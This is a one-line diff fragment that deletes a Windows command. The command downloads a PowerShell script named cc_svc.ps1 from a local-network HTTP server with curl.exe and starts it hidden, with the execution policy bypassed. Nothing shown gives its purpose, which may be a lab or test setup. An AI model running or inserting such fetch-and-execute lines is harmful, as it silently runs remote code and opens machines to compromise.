@@ -1,1 +1,0 @@
-curl.exe -s -o C:\cc_svc.ps1 http://192.168.122.1:8000/cc_svc.ps1; Start-Process powershell -ArgumentList @("-NoProfile","-ExecutionPolicy","Bypass","-WindowStyle","Hidden","-File","C:\cc_svc.ps1"); Write-Output STARTED
